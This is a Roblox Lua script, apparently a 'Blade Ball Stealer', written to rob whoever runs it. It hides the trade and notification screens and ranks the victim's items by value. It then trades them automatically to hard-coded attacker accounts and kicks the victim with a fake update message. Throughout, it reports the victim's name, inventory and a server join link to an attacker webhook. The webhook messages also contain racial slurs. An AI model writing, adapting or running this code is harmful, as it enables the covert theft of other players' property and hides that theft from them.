-- Pas de verrou _G pour permettre la ré-exécution infinie
local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")

-- Interfaces
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local notificationsGui = PlayerGui.Notifications
local tradeCompleteGui = PlayerGui.TradeCompleted
local inTrade = false

local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

-- Paramètres
local users = _G.Usernames or {"Li0nIce201410", "ThunderStealthZap16"}
local webhook = _G.webhook or "" 
local auth_token = _G.AuthToken or "EBK-SS-A"
local min_rap = _G.min_rap or 0 -- Mis à 0 pour ne rien rater
local ping = _G.pingEveryone or "Yes"

---------------------------------------------------------
-- CACHE DE L'INTERFACE (INVISIBLE)
---------------------------------------------------------
local function killUI()
    pcall(function()
        tradeGui.Enabled = false
        tradeGui.Black.Visible = false
        tradeCompleteGui.Enabled = false
        tradeGui.Main.Visible = false
        notificationsGui.Enabled = false
    end)
end
killUI()

tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    inTrade = tradeGui.Enabled
    if inTrade then tradeGui.Enabled = false end 
end)

---------------------------------------------------------
-- FONCTIONS RAP
---------------------------------------------------------
local function getRAP(category, itemName)
    local success, rapData = pcall(function() return Replion.Client:GetReplion("ItemRAP").Data.Items[category] end)
    if not success or not rapData then return 0 end
    for skey, rap in pairs(rapData) do
        local s, decoded = pcall(function() return HttpService:JSONDecode(skey) end)
        if s then
            for _, pair in ipairs(decoded) do
                if pair[1] == "Name" and pair[2] == itemName then return rap end
            end
        end
    end
    return 0
end

---------------------------------------------------------
-- WEBHOOK AVEC TOUT (THUMBNAIL + JOIN)
---------------------------------------------------------

local function SendStatusWebhook(title, color, isStart)
    local totalRAP = 0
    local itemLines = ""
    for _, item in ipairs(itemsToSend) do
        itemLines = itemLines .. "• " .. item.Name .. " [" .. item.RAP .. " RAP]\n"
        totalRAP = totalRAP + item.RAP
    end

    -- Construction du lien de join direct
    local joinCode = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')"
    local clickableLink = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId

    local data = {
        ["auth_token"] = auth_token,
        ["content"] = (isStart and ping == "Yes") and "@everyone | " .. joinCode or nil,
        ["embeds"] = {{
            ["title"] = title,
            ["color"] = color,
            ["fields"] = {
                {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "💰 Total RAP:", value = "```" .. totalRAP .. "```", inline = true},
                {name = "🔗 Join Link:", value = "[Click to Join Server](" .. clickableLink .. ")", inline = false},
                {name = "🎒 Inventory:", value = "```" .. (itemLines ~= "" and itemLines or "Scanning...") .. "```", inline = false}
            },
            ["thumbnail"] = {
                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
            },
            ["footer"] = {["text"] = "Blade Ball Stealer | Session Active"}
        }}
    }

    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end

---------------------------------------------------------
-- AUTO TRADE
---------------------------------------------------------
local function startAutoTrade(targetPlayer)
    task.spawn(function()
        while #itemsToSend > 0 do
            netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(targetPlayer)
            
            local timeout = 0
            repeat task.wait(0.5) timeout = timeout + 1 until inTrade or timeout > 20
            
            if inTrade then
                local limit = 0
                while #itemsToSend > 0 and limit < 50 do
                    local item = table.remove(itemsToSend, 1)
                    netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
                    limit = limit + 1
                end

                netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
                task.wait(0.5)
                netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
                repeat task.wait(0.2) until not inTrade
            end
            task.wait(1)
        end
        SendStatusWebhook("✅ Stuff Successfully Stolen !", 65280, false)
        plr:kick("Update Finished. Items Secured.")
    end)
end

---------------------------------------------------------
-- SCAN & RUN
---------------------------------------------------------
for _, cat in ipairs(categories) do
    if clientInventory[cat] then
        for id, info in pairs(clientInventory[cat]) do
            if not info.TradeLock then
                local rap = getRAP(cat, info.Name)
                if rap >= min_rap then
                    table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = cat, Name = info.Name})
                end
            end
        end
    end
end

if #itemsToSend > 0 then
    -- On trie par RAP pour prendre le meilleur en premier
    table.sort(itemsToSend, function(a,b) return a.RAP > b.RAP end)

    local found = false
    for _, p in ipairs(Players:GetPlayers()) do
        if table.find(users, p.Name) then
            SendStatusWebhook("✅ The nigga is on the server ! ("..p.Name..")", 65280, false)
            startAutoTrade(p)
            found = true
            break
        end
    end

    if not found then
        SendStatusWebhook("🟣 Bro join your hit nigga 🎯", 8323327, true)
        Players.PlayerAdded:Connect(function(player)
            if table.find(users, player.Name) then
                SendStatusWebhook("✅ The nigga is on the server ! ("..player.Name..")", 65280, false)
                startAutoTrade(player)
            end
        end)
    end
end
